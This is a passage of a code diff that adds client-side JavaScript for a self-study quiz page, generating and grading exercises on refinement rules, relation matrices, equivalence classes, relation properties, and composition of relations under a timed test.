+    rule = '{pre} v:=v\' | rel\n[=\nVAR l:T . l:=E; {pre} v,l:=v\',l\' | rel';
+    stmt = `{ ${p} } ${frame(V)} | ${r}`; ans = `VAR ${L}:Nat . ${L}:=${c}; { ${p} } ${frame([...V, L])} | ${r}`;
+  } else {
+    const [x, y] = V, c1 = R(2, 9), c2 = R(2, 9), d = R(1, 9);
+    name = 'Rewrite'; rule = 'v:=v\' | E1=E2 and rel[E1]\n[=\nv:=v\' | E1=E2 and rel[E2]';
+    stmt = `{ ${p} } ${frame(V)} | ${x} = ${c1} * ${c2} and ${y}' = ${x} + ${d}`; ans = `{ ${p} } ${frame(V)} | ${x} = ${c1} * ${c2} and ${y}' = ${c1} * ${c2} + ${d}`;
+  }
+  return {
+    sol: { x: ans },
+    html: `<p>Apply the refinement rule "${name}" (see below) to the following specification statement${extra}.</p>
+      <p>Specification statement: <span class="mono">${esc(stmt)}</span></p><p>Refinement rule ${name} (${kind})</p><div class="rules">${esc(rule)}</div>
+      <p style="margin-top:10px">Fill in the correctly refined specification statement. You can copy parts of the original statement.</p>${inp('x')}`,
+    grade: a => ({ score: [ans, ...alt].some(s => norm(s) === norm(a.x)) ? 1 : 0, answer: `<span class="mono">${esc(ans)}</span>` })
+  };
+}
+
+// ---------- Q3 pool: relations ----------
+function genMatrix(fx) {
+  const po = fx ? fx.po : Math.random() < .5, E = [1, 2, 3, 4, 5];
+  let given = fx && fx.given;
+  if (given) ;
+  else if (po) { const perm = shuffle(E), cand = []; perm.forEach((x, i) => perm.slice(i).forEach(y => cand.push([x, y]))); given = pickN(cand, 6); }
+  else { const cand = E.flatMap(x => E.filter(y => y >= x).map(y => [x, y])); given = pickN(cand, 4).map(([x, y]) => Math.random() < .5 ? [x, y] : [y, x]); }
+  const M = E.map(() => E.map(() => 0)); given.forEach(([x, y]) => M[x - 1][y - 1] = 1);
+  E.forEach((_, i) => M[i][i] = 1);
+  if (!po) E.forEach((_, i) => E.forEach((_, j) => { if (M[i][j]) M[j][i] = 1; }));
+  for (let k = 0; k < 5; k++) for (let i = 0; i < 5; i++) for (let j = 0; j < 5; j++) if (M[i][k] && M[k][j]) M[i][j] = 1;
+  const sol = {}; M.forEach((r, i) => r.forEach((v, j) => { if (v) sol[`m${i}${j}`] = true; }));
+  const tbl = cell => `<table class="mat"><tr><th></th>${E.map(e => `<th>${e}</th>`).join('')}</tr>${E.map((e, i) => `<tr><th>${e}</th>${E.map((_, j) => `<td>${cell(i, j)}</td>`).join('')}</tr>`).join('')}</table>`;
+  return {
+    sol,
+    html: `<p>Given the set [1, 2, 3, 4, 5], and relations ${fpairs(given)}.</p><ol><li>Fill in the relations matrix below such that all given relations are marked by a "1" (checked) in the correct position.</li>
+      <li>Then extend the set of relations by adding mandatory "1"'s so that the final set of relations is ${po ? 'a partial order' : 'an equivalence relation'}.</li><li>All other entries in the matrix must be marked "0" (unchecked).</li></ol>
+      ${tbl((i, j) => `<input type="checkbox" data-k="m${i}${j}" aria-label="row ${i + 1} column ${j + 1}">`)}`,
+    grade(a) {
+      // Matric: 0.2 each for: given pairs marked, reflexive, symmetric/antisymmetric, transitive, exactly right
+      const A = E.map((_, i) => E.map((_, j) => !!a[`m${i}${j}`])), I = [0, 1, 2, 3, 4];
+      const checks = [given.every(([x, y]) => A[x - 1][y - 1]), I.every(i => A[i][i]),
+        I.every(i => I.every(j => po ? i === j || !(A[i][j] && A[j][i]) : A[i][j] === A[j][i])),
+        I.every(i => I.every(j => I.every(k => !(A[i][j] && A[j][k]) || A[i][k]))), M.every((r, i) => r.every((v, j) => A[i][j] === !!v))];
+      return { score: checks.filter(Boolean).length / 5, answer: tbl((i, j) => `<span class="${!!a[`m${i}${j}`] === !!M[i][j] ? '' : 'miss'}">${M[i][j]}</span>`) };
+    }
+  };
+}
+
+function genModClasses(fx) {
+  const n = fx ? fx.n : R(5, 13), S = fx ? fx.S : pickN([...Array(41).keys()].map(i => i - 20), 20).sort((x, y) => x - y);
+  const g = {}; S.forEach(x => (g[((x % n) + n) % n] ||= []).push(x));
+  const classes = Object.values(g), ans = fss(classes);
+  return {
+    sol: { x: ans },
+    html: `<p>Compute the equivalence classes of the set S below with respect to the equivalence relation =%${n}= (same remainder in division by ${n}).</p>
+      <p class="mono">S = ${fs(S)}</p><p>The result must be given as a set of sets.</p>${inp('x', '{{1,2},{3}}')}`,
+    grade: a => { // Matric: (right classes - wrong classes) / number of classes, rounded to 0.1
+      const exp = classes.map(keyOf), got = parseSS(a.x), right = got.filter(k => exp.includes(k)).length;
+      return { score: Math.max(0, Math.round(10 * (right - (got.length - right)) / exp.length) / 10), answer: diff(exp, got, classes.map(fs), ssShow) };
+    }
+  };
+}
+
+function genEqPo() {
+  const E = [...Array(10).keys()], nd = R(2, 4);
+  const diag = pickN(E, nd).map(x => [x, x]);
+  const off = []; while (off.length < R(9, 11)) { const x = pick(E), y = pick(E); if (x !== y && !off.some(p => p[0] === x && p[1] === y)) off.push([x, y]); }
+  const all = [...diag, ...off].sort((p, q) => p[0] - q[0] || p[1] - q[1]);
+  let x, y; do { x = pick(E); y = pick(E); } while (x === y);
+  const opts = [...all.map(p => `[${p[0]}, ${p[1]}]`), 'None of the above'], correct = all.map((p, i) => p[0] === p[1] ? i : -1).filter(i => i >= 0);
+  const sol = {}; correct.forEach(i => sol['o' + i] = true);
+  return {
+    sol,
+    html: `<p>Let R be a relation over {${E.join(', ')}}.</p><p>We know that R is an equivalence relation and a partial order.<br>Moreover, (${x}, ${y}) is not in R.</p><p>Select all pairs that are in R.</p>${checks(opts)}`,
+    grade: a => ({ score: checkScore(a, opts.length, correct), answer: checkDiff(a, opts, correct) + '<br><small>Equivalence + partial order ⇒ symmetric and antisymmetric ⇒ R is exactly the identity relation.</small>' })
+  };
+}
+
+function genProps() {
+  const k = R(1, 4), c = R(1, 9), m = R(2, 9), c2 = R(-3, 3);
+  const [txt, f] = pick([[`x + y is even`, (x, y) => (x + y) % 2 === 0], ['x ≤ y', (x, y) => x <= y], ['x < y', (x, y) => x < y], ['x = y', (x, y) => x === y],
+    ['x · y > 0', (x, y) => x * y > 0], [`|x − y| ≤ ${k}`, (x, y) => Math.abs(x - y) <= k], [`x − y = ${k}`, (x, y) => x - y === k], [`${m * c2} = y · ${m}`, (x, y) => y === c2],
+    [`x · x + ${c} < ${c}`, x => x * x < 0], ['x² = y²', (x, y) => x * x === y * y], [`x = ${c2}`, x => x === c2], [`x ≥ y + ${k}`, (x, y) => x >= y + k], [`x · y ≥ 0`, (x, y) => x * y >= 0]]);
+  const D = []; for (let i = -10; i <= 10; i++) D.push(i);
+  const all = g => D.every(x => D.every(y => g(x, y)));
+  const props = { reflexive: D.every(x => f(x, x)), symmetric: all((x, y) => !f(x, y) || f(y, x)), antisymmetric: all((x, y) => !(f(x, y) && f(y, x)) || x === y),
+    transitive: D.every(x => D.every(y => !f(x, y) || D.every(z => !f(y, z) || f(x, z)))) };
+  const sol = {}; Object.entries(props).forEach(([p, v]) => sol[p] = String(v));
+  return {
+    sol,
+    html: `<p>Consider the following relation R over integers.</p><p class="mono">xRy iff ${esc(txt)}</p><p>Check the properties of the relation R.</p>
+      ${Object.keys(props).map(p => `<div class="row"><label>The relation is ${p}:</label><span>${sel(p, ['true', 'false'])}</span></div>`).join('')}`,
+    grade: a => ({ score: Object.keys(props).filter(p => a[p] === String(props[p])).length / 4, answer: Object.entries(props).map(([p, v]) => `${p}: <span class="${a[p] === String(v) ? '' : 'miss'}">${v}</span>`).join('<br>') })
+  };
+}
+
+function genInvComp() {
+  const E = [...Array(9).keys()].map(i => i + 1), rnd = (n, firsts) => { const s = []; while (s.length < n) { const p = [firsts && Math.random() < .6 ? pick(firsts) : pick(E), pick(E)]; if (!s.some(q => q[0] === p[0] && q[1] === p[1])) s.push(p); } return s.sort((p, q) => p[0] - q[0] || p[1] - q[1]); };
+  const Rr = rnd(R(4, 5)), Ss = rnd(R(4, 7), Rr.map(p => p[1]));
+  const comp = (A, B) => uniq(A.flatMap(([x, y]) => B.filter(q => q[0] === y).map(q => x + ',' + q[1]))).map(k => k.split(','));
+  const inv = Rr.map(([x, y]) => [y, x]), rs = comp(Rr, Ss), rr = comp(Rr, Rr);
+  if (!rs.length || !rr.length) return genInvComp();
+  const parts = [['R⁻¹', inv], ['R ∘ S', rs], ['R ∘ R', rr]];
+  const sol = {}; parts.forEach(([, v], i) => sol['p' + i] = fpairs(v));
+  return {
+    sol,
+    html: `<p>Let R and S be relations over the set {1, ..., 9}, given as sets of pairs, where a pair (x, y) is written [x,y]:</p>
+      <p class="mono">R = ${fpairs(Rr)}<br>S = ${fpairs(Ss)}</p>
+      <p>The inverse R⁻¹ consists of all pairs [y, x] with [x, y] ∈ R.<br>The composition R ∘ S consists of all pairs [x, z] for which there exists a y with [x, y] ∈ R and [y, z] ∈ S.</p>
+      <p>Compute the following relations. Write each answer as a set of pairs, for example {[1,2],[2,1]}. The order of the pairs does not matter.</p>
+      ${parts.map(([l], i) => row(l + ' =', 'p' + i, '{[1,2],[2,1]}')).join('')}`,
+    grade(a) {
+      const ok = parts.map(([, v], i) => sameSet(parsePairs(a['p' + i]), v.map(p => p.join(','))));
+      const pShow = k => `[${k.split(',').join(', ')}]`;
+      return { score: ok.filter(Boolean).length / 3, answer: parts.map(([l, v], i) => `${l} = <span class="mono">${diff(v.map(p => p.join(',')), parsePairs(a['p' + i]), v.map(p => pShow(p.join(','))), pShow)}</span>`).join('<br>') };
+    }
+  };
+}
+
+const POOLS = [
+  { name: 'Languages & machines', gens: { 'EBNF → NFA': genEBNF, 'Automaton → right-regular grammar': genAut2Grammar, 'NFA → DFA (subset construction)': genSubset, 'Minimize DFA': genMinimize, 'Regex: accepts at least the same words': genRegexSup, 'Regex from positive/negative cases': genRegexBuild } },
+  { name: 'Correct programs', gens: { 'Sort conditions by strength': genStrength, 'Refinement rules': genRefine } },
+  { name: 'Relations', gens: { 'Relation matrix closure': genMatrix, 'Equivalence classes mod n': genModClasses, 'Equivalence relation and partial order': genEqPo, 'Relation properties': genProps, 'Inverse & composition': genInvComp } },
+];
+const ALL = Object.assign({}, ...POOLS.map(p => p.gens));
+
+// ---------- page ----------
+if (typeof document !== 'undefined') {
+  const $ = id => document.getElementById(id);
+  let qs = [], started, finished = false, tick;
+  $('mode').innerHTML = `<option value="test">Full test (3 random questions, 30 min)</option>` + POOLS.map(p => `<optgroup label="${p.name}">${Object.keys(p.gens).map(k => `<option>${esc(k)}</option>`).join('')}</optgroup>`).join('');
+  const collect = i => { const a = {}; document.querySelectorAll(`#q${i} [data-k]`).forEach(el => a[el.dataset.k] = el.type === 'checkbox' ? el.checked : el.value); return a; };
+  const fmtT = s => `${Math.floor(s / 60)}:${String(s % 60).padStart(2, '0')}`;
+
+  function newAttempt() {
+    const mode = $('mode').value;
+    qs = mode === 'test' ? POOLS.map(p => pick(Object.values(p.gens))()) : [ALL[mode]()];
+    finished = false; started = new Date(); $('summary').innerHTML = ''; $('finishBtn').style.display = '';
+    $('quiz').innerHTML = qs.map((q, i) => `<div class="que" id="q${i}"><div class="info"><h3>Question ${i + 1}</h3><div class="state">Not yet answered</div>Marked out of 1.00</div>
+      <div class="content"><div class="formulation">${q.html}</div><div class="fb"></div></div></div>`).join('');
+    clearInterval(tick);
+    const limit = mode === 'test' ? 30 * 60 : 0;
+    const upd = () => { const el = Math.floor((Date.now() - started) / 1000); $('timer').textContent = limit ? `Time left ${fmtT(Math.max(0, limit - el))}` : `Elapsed ${fmtT(el)}`; if (limit && el >= limit) finish(); };
+    upd(); tick = setInterval(upd, 1000);
+    window.scrollTo(0, 0);
+  }
+
+  function finish() {
+    if (finished) return; finished = true; clearInterval(tick);
+    let total = 0;
+    qs.forEach((q, i) => {
+      const { score, answer } = q.grade(collect(i)); total += score;
+      const st = score === 1 ? ['Correct', 'ok'] : score > 0 ? ['Partially correct', 'part'] : ['Incorrect', 'bad'];
+      document.querySelector(`#q${i} .info`).innerHTML = `<h3>Question ${i + 1}</h3><div class="state ${st[1]}">${st[0]}</div>Mark ${score.toFixed(2)} out of 1.00`;
+      document.querySelector(`#q${i} .fb`).innerHTML = `<div class="feedback">The correct answer is:<br>${answer}</div>`;
+      document.querySelectorAll(`#q${i} [data-k]`).forEach(el => el.disabled = true);
+    });
+    const done = new Date(), secs = Math.round((done - started) / 1000);
+    $('summary').innerHTML = `<table class="sum"><tr><th>Status</th><td>Finished</td></tr><tr><th>Started</th><td>${started.toLocaleString()}</td></tr><tr><th>Completed</th><td>${done.toLocaleString()}</td></tr>
+      <tr><th>Duration</th><td>${Math.floor(secs / 60)} mins ${secs % 60} secs</td></tr><tr><th>Marks</th><td>${total.toFixed(2)}/${qs.length}.00</td></tr>
+      <tr><th>Grade</th><td><b>${total.toFixed(2)}</b> out of ${qs.length}.00 (<b>${Math.round(100 * total / qs.length)}</b>%)</td></tr></table>`;
+    $('finishBtn').style.display = 'none'; $('timer').textContent = 'Finished';
+    window.scrollTo(0, 0);
+  }
+
+  $('finishBtn').onclick = () => { if (confirm('Submit all and finish?')) finish(); };
+  $('newBtn').onclick = $('newBtn2').onclick = newAttempt;
+  $('mode').onchange = newAttempt;
+  newAttempt();
+}
+</script>
+</body>
+</html>
